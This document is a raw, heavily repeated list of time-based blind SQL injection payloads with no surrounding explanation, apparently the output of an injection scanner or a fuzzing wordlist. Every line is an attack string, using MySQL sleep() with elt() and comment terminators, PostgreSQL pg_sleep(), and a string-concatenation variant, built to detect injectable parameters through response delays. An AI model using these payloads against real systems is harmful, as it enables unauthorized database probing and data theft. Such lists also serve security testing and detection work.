+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
